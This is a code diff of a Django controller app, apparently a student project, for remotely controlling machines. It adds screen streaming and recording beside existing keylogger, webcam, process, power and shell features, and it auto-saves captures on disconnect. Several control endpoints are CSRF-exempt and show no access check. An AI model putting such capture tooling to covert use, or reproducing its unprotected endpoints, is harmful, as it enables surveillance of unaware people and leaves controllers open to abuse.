@@ -54,8 +54,15 @@ def _get_client(request):
 def cleanup_missing_recordings():
     """Helper: Xóa record trong DB nếu file thực tế không tồn tại"""
     try:
-        # Sửa video_file -> file_path để khớp với Model của nhóm bạn
+        from .models import WebcamRecording, ScreenRecording
+        
+        # Dọn dẹp Webcam
         for rec in WebcamRecording.objects.all():
+            if not rec.file_path or not os.path.exists(rec.file_path.path):
+                rec.delete()
+                
+        # Dọn dẹp Screen Recording
+        for rec in ScreenRecording.objects.all():
             if not rec.file_path or not os.path.exists(rec.file_path.path):
                 rec.delete()
     except Exception:
@@ -95,14 +102,14 @@ def processes_page(request):
 def screenshot_page(request):
     return render(request, 'remote_control/screenshot.html')
 
-
 def keylogger_page(request):
     return render(request, 'remote_control/keylogger.html')
-
 
 def webcam_page(request):
     return render(request, 'remote_control/webcam.html')
 
+def screen_page(request):
+    return render(request, 'remote_control/screen.html')
 
 def power_page(request):
     return render(request, 'remote_control/power.html')
@@ -221,40 +228,97 @@ def disconnect_server(request):
     4. Cleanup resources
     """
     try:
-        # Lấy client hiện tại (nếu còn sống)
         client = _get_client(request)
         if client and client.connected:
+            
+            # ================= 1. XỬ LÝ WEBCAM (AUTO SAVE + OFF) =================
+            try:
+                # 1.1 Kiểm tra trạng thái
+                status = client.webcam_status()
+                
+                # 1.2 Nếu đang quay -> Lưu file
+                if status.get('recording'):
+                    logger.info("Auto-saving WEBCAM before disconnect...")
+                    res = client.webcam_stop_recording()
+                    
+                    if res.get('success'):
+                        from .models import WebcamRecording
+                        from django.core.files.base import ContentFile
+                        
+                        # Lưu vào Model WebcamRecording
+                        fname = res.get('filename', 'webcam_autosave.avi')
+                        rec = WebcamRecording(
+                            server_ip=request.session.get('target_server_ip', 'unknown'),
+                            filename=fname,
+                            file_size=res.get('file_size'),
+                            duration=res.get('duration', 0)
+                        )
+                        rec.file_path.save(fname, ContentFile(res.get('video_data')), save=True)
+            except Exception as e:
+                logger.error(f"Error auto-saving webcam: {e}")
+
+            # 1.3 Luôn luôn tắt Webcam
             try:
                 client.webcam_off()
-            except:
-                pass
+            except: pass
 
+
+            # ================= 2. XỬ LÝ SCREEN RECORDER (AUTO SAVE + OFF) =================
+            try:
+                # 2.1 Kiểm tra trạng thái
+                status = client.screen_status()
+                
+                # 2.2 Nếu đang quay -> Lưu file (QUAN TRỌNG: Dùng Model ScreenRecording)
+                if status.get('recording'):
+                    logger.info("Auto-saving SCREEN before disconnect...")
+                    res = client.screen_stop_recording()
+                    
+                    if res.get('success'):
+                        from .models import ScreenRecording  # <--- Import đúng Model mới
+                        from django.core.files.base import ContentFile
+                        
+                        # Lấy tên file gốc
+                        raw_name = res.get('filename', 'screen_autosave.avi')
+                        # Thêm prefix SCREEN_ (tùy chọn, để dễ nhìn)
+                        final_name = "SCREEN_" + raw_name
+                        
+                        rec = ScreenRecording(
+                            server_ip=request.session.get('target_server_ip', 'unknown'),
+                            filename=final_name,
+                            file_size=res.get('file_size'),
+                            duration=res.get('duration', 0)
+                        )
+                        # Lưu file (sẽ tự vào folder screen_recordings/ do Model quy định)
+                        rec.file_path.save(final_name, ContentFile(res.get('video_data')), save=True)
+                        logger.info(f"Screen recording saved: {final_name}")
+                        
+            except Exception as e:
+                logger.error(f"Error auto-saving screen: {e}")
+
+            # 2.3 Luôn luôn tắt Screen Stream
+            try:
+                client.screen_stop_stream()
+            except: pass
+
+
+            # ================= 3. DỌN DẸP KHÁC =================
             try:
                 client.shell_reset()
-            except Exception as e:
-                logger.warning(f"Shell reset error: {e}")
+            except: pass
 
+        # Clean session
         session_id = request.session.session_key
-        
         if session_id:
-            # Disconnect và remove khỏi pool
             PersistentRemoteClient.disconnect_session(session_id)
         
-        # Xóa thông tin khỏi session
         if 'target_server_ip' in request.session:
             del request.session['target_server_ip']
         
-        return JsonResponse({
-            "success": True,
-            "message": "Disconnected from server"
-        })
+        return JsonResponse({"success": True, "message": "Disconnected and saved all recordings"})
     
     except Exception as e:
         logger.error(f"Disconnect error: {str(e)}")
-        return JsonResponse({
-            "success": False,
-            "message": str(e)
-        }, status=500)
+        return JsonResponse({"success": False, "message": str(e)}, status=500)
 
 
 # ==================== EXISTING APIs (Updated to use Persistent Client) ====================
@@ -707,3 +771,112 @@ def webcam_delete(request, recording_id):
     except Exception as e:
         logger.error(f"Delete recording error: {str(e)}")
         return JsonResponse({"success": False, "message": str(e)}, status=500)
+
+# ==================== SCREEN RECORDING APIs (MỚI) ====================
+
+@require_http_methods(["GET"])
+def screen_list(request):
+    cleanup_missing_recordings()
+
+    try:
+        # Import model mới
+        from .models import ScreenRecording
+        
+        # Lấy tất cả ScreenRecordings (không cần lọc tên nữa vì đã tách bảng)
+        recordings = ScreenRecording.objects.all().order_by('-recorded_at')
+        
+        data = []
+        for rec in recordings:
+            # Format thời gian (MM:SS)
+            duration_str = str(rec.duration)
+            formatted_duration = "00:00:00"
+            if duration_str.isdigit():
+                seconds = int(duration_str)
+                m, s = divmod(seconds, 60)
+                h, m = divmod(m, 60)
+                formatted_duration = "{:02d}:{:02d}:{:02d}".format(h, m, s)
+
+            data.append({
+                "id": rec.id,
+                "filename": rec.filename,
+                "file_url": rec.file_path.url if rec.file_path else "",
+                "recorded_at": rec.recorded_at.strftime("%Y-%m-%d %H:%M:%S"),
+                "file_size": rec.get_file_size_display(),
+                "duration": formatted_duration
+            })
+        return JsonResponse({"success": True, "recordings": data})
+    except Exception as e:
+        return JsonResponse({"success": False, "message": str(e)})
+    
+@csrf_exempt
+@require_http_methods(["POST"])
+def screen_stream_on(request):
+    client = _get_client(request)
+    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
+    return JsonResponse(client.screen_start_stream())
+
+@csrf_exempt
+@require_http_methods(["POST"])
+def screen_stream_off(request):
+    client = _get_client(request)
+    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
+    return JsonResponse(client.screen_stop_stream())
+
+@require_http_methods(["GET"])
+def screen_stream_frame(request):
+    client = _get_client(request)
+    if not client: return HttpResponse(status=204)
+    frame_data = client.screen_get_frame()
+    if frame_data: return HttpResponse(frame_data, content_type='image/jpeg')
+    return HttpResponse(status=204)
+
+@csrf_exempt
+@require_http_methods(["POST"])
+def screen_start_rec(request):
+    client = _get_client(request)
+    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
+    return JsonResponse(client.screen_start_recording())
+
+@csrf_exempt
+@require_http_methods(["POST"])
+def screen_stop_rec(request):
+    client = _get_client(request)
+    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
+    try:
+        result = client.screen_stop_recording()
+        if not result.get('success'): return JsonResponse(result)
+        
+        # Import model mới
+        from .models import ScreenRecording
+        from django.core.files.base import ContentFile
+        
+        filename = result.get('filename', 'unknown.avi')
+        # Thêm prefix SCREEN_ để dễ nhận biết (tùy chọn)
+        final_filename = "SCREEN_" + filename 
+        
+        # Lưu vào model ScreenRecording
+        rec = ScreenRecording(
+            server_ip=request.session.get('target_server_ip', 'unknown'),
+            filename=final_filename,
+            file_size=result.get('file_size'),
+            duration=result.get('duration')
+        )
+        
+        # Django sẽ tự lưu vào media/screen_recordings/YYYY/MM/DD/ nhờ upload_to trong models.py
+        rec.file_path.save(final_filename, ContentFile(result.get('video_data')), save=True)
+        
+        return JsonResponse({
+            "success": True, 
+            "message": "Saved successfully",
+            "filename": final_filename,
+            "file_size": rec.get_file_size_display(),
+            "duration": result.get('duration')
+        })
+        
+    except Exception as e: return JsonResponse({"success": False, "message": str(e)}, status=500)
+
+@require_http_methods(["GET"])
+def screen_get_status(request):
+    client = _get_client(request)
+    if not client: return JsonResponse({"stream_on": False, "recording": False})
+    return JsonResponse(client.screen_status())
